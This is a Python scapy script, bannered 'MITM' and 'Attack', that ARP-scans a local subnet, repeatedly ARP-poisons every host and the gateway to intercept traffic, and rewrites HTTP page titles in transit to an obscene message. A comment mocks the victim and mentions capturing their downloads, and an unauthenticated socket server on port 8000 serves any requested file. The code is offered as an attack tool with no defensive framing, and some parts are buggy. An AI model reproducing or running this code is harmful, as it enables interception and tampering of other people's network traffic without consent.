from scapy.all import *
import scapy
import time


#MMMMMMMM               MMMMMMMM     IIIIIIIIII     TTTTTTTTTTTTTTTTTTTTTTT     MMMMMMMM               MMMMMMMM
#M:::::::M             M:::::::M     I::::::::I     T:::::::::::::::::::::T     M:::::::M             M:::::::M
#M::::::::M           M::::::::M     I::::::::I     T:::::::::::::::::::::T     M::::::::M           M::::::::M
#M:::::::::M         M:::::::::M     II::::::II     T:::::TT:::::::TT:::::T     M:::::::::M         M:::::::::M
#M::::::::::M       M::::::::::M       I::::I       TTTTTT  T:::::T  TTTTTT     M::::::::::M       M::::::::::M
#M:::::::::::M     M:::::::::::M       I::::I               T:::::T             M:::::::::::M     M:::::::::::M
#M:::::::M::::M   M::::M:::::::M       I::::I               T:::::T             M:::::::M::::M   M::::M:::::::M
#M::::::M M::::M M::::M M::::::M       I::::I               T:::::T             M::::::M M::::M M::::M M::::::M
#M::::::M  M::::M::::M  M::::::M       I::::I               T:::::T             M::::::M  M::::M::::M  M::::::M
#M::::::M   M:::::::M   M::::::M       I::::I               T:::::T             M::::::M   M:::::::M   M::::::M
#M::::::M    M:::::M    M::::::M       I::::I               T:::::T             M::::::M    M:::::M    M::::::M
#M::::::M     MMMMM     M::::::M       I::::I               T:::::T             M::::::M     MMMMM     M::::::M
#M::::::M               M::::::M     II::::::II           TT:::::::TT           M::::::M               M::::::M
#M::::::M               M::::::M     I::::::::I           T:::::::::T           M::::::M               M::::::M
#M::::::M               M::::::M     I::::::::I           T:::::::::T           M::::::M               M::::::M
#MMMMMMMM               MMMMMMMM     IIIIIIIIII           TTTTTTTTTTT           MMMMMMMM               MMMMMMMM


#   _______________                        |*\_/*|________
#  |  ___________  |     .-.     .-.      ||_/-\_|______  |
#  | |           | |    .****. .****.     | |           | |
#  | |   0   0   | |    .*****.*****.     | |   0   0   | |
#  | |     -     | |     .*********.      | |     -     | |
#  | |   \___/   | |      .*******.       | |   \___/   | |
#  | |___     ___| |       .*****.        | |___________| |
#  |_____|\_/|_____|        .***.         |_______________|
#    _|__|/ \|_|_.............*.............._|________|_
#   / ********** \                          / ********** \
# /  ************  \                      /  ************  \
#--------------------                    --------------------

gw_ip= get_if_addr(conf.iface)
gw_mac = get_if_hwaddr(conf.iface)
gw = {'IP':gw_ip, 'MAC':gw_mac}
print("HOST IP "+ gw_ip)

latency = 5
counter = 0
 
def scan(range):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=range)
    result = srp(pkt,verbose=0,timeout=5)[0]
    targets = []
    for sent,recived in result:
        if (recived.psrc != gw_ip and recived.psrc != '192.168.1.1'):
            targets.append({'IP':recived.psrc, 'MAC':recived.hwsrc})
    
    print("========TARGETS==========")
    for target in targets:
        print("{}         {}".format(target['IP'],target['MAC']))

    return targets


#              spoof = sender
def poison(target,spoof):
    #op= opcode, psrc = sender, pdst = target
    pkt = ARP(op = 2, hwsrc = '192.168.1.1', psrc = spoof['IP'], pdst = target['IP'], hwdst = target['MAC'])
    send(pkt,verbose = False)

def heal(sn_ip, recv_ip):
    pkt = ARP(op = 2, pdst = recv_ip['IP'], hwdst = recv_ip['MAC'],psrc = sn_ip['IP'],hwsrc = sn_ip['MAC'])
    send(pkt,verbose = False)


targets = scan("192.168.1.0/24")

def ManInTheMiddleNetwork():
    for i in range(10):
        while True:
            for target in targets:
                poison(gw,target)
                poison(target,gw)
            time.sleep(latency)

#               AAA                tttt               tttt                                               kkkkkkkk           
#              A:::A            ttt:::t            ttt:::t                                               k::::::k           
#             A:::::A           t:::::t            t:::::t                                               k::::::k           
#            A:::::::A          t:::::t            t:::::t                                               k::::::k           
#           A:::::::::A   ttttttt:::::tttttttttttttt:::::ttttttt      aaaaaaaaaaaaa      cccccccccccccccc k:::::k    kkkkkkk
#          A:::::A:::::A  t:::::::::::::::::tt:::::::::::::::::t      a::::::::::::a   cc:::::::::::::::c k:::::k   k:::::k 
#         A:::::A A:::::A t:::::::::::::::::tt:::::::::::::::::t      aaaaaaaaa:::::a c:::::::::::::::::c k:::::k  k:::::k  
#        A:::::A   A:::::Atttttt:::::::tttttttttttt:::::::tttttt               a::::ac:::::::cccccc:::::c k:::::k k:::::k   
#       A:::::A     A:::::A     t:::::t            t:::::t              aaaaaaa:::::ac::::::c     ccccccc k::::::k:::::k    
#      A:::::AAAAAAAAA:::::A    t:::::t            t:::::t            aa::::::::::::ac:::::c              k:::::::::::k     
#     A:::::::::::::::::::::A   t:::::t            t:::::t           a::::aaaa::::::ac:::::c              k:::::::::::k     
#    A:::::AAAAAAAAAAAAA:::::A  t:::::t    tttttt  t:::::t    tttttta::::a    a:::::ac::::::c     ccccccc k::::::k:::::k    
#   A:::::A             A:::::A t::::::tttt:::::t  t::::::tttt:::::ta::::a    a:::::ac:::::::cccccc:::::ck::::::k k:::::k   
#  A:::::A               A:::::Att::::::::::::::t  tt::::::::::::::ta:::::aaaa::::::a c:::::::::::::::::ck::::::k  k:::::k  
# A:::::A                 A:::::A tt:::::::::::tt    tt:::::::::::tt a::::::::::aa:::a cc:::::::::::::::ck::::::k   k:::::k 
#AAAAAAA                   AAAAAAA  ttttttttttt        ttttttttttt    aaaaaaaaaa  aaaa   cccccccccccccccckkkkkkkk    kkkkkkk

def process_packet(pkt):
    if(str(pkt.payload).__contains__('text/html')):
        if(str(pkt.payload).__contains__('<title>')):
            modifyPacketAndSend(pkt)
            return
    pkt.send()
def modifyPacketAndSend(pkt):
    output=pkt
    load = str(pkt.payload)
    #Make the change
    start = load.find('<title>')
    end = load.find('</title>')

    change = "<title>GET FUCKED"

    #before making changes I need to save the
    #actual download so then I would download it later
    #and the stupid karen wont know a thing
    

    load = load[0:start] + change + load[end:]

    print(load)
    print(load[start] , load[end])
    #rebuild to packet
    output[TCP].load = load
    output.show2()

    output.send()
    pass

def activate_attack():
    print("Sniffing")
    sniff(filter="port 80 and tcp", prn=process_packet, store=False)

import socket
def downloader():
    HOST = ''  # all available interfaces
    PORT = 8000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()

        print(f'Server listening on port {PORT}')

        while True:
            client_socket, client_address = server_socket.accept()
            print(f'Connected by {client_address}')

            request = client_socket.recv(1024).decode()
            if request.startswith('GET /'):
                filename = request.split()[1][1:]  # extract filename from request
                try:
                    with open(filename, 'rb') as f:
                        data = f.read()
                        client_socket.sendall(data)
                except FileNotFoundError:
                    client_socket.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
            else:
                client_socket.sendall(b'HTTP/1.1 400 Bad Request\r\n\r\n')

            client_socket.close()


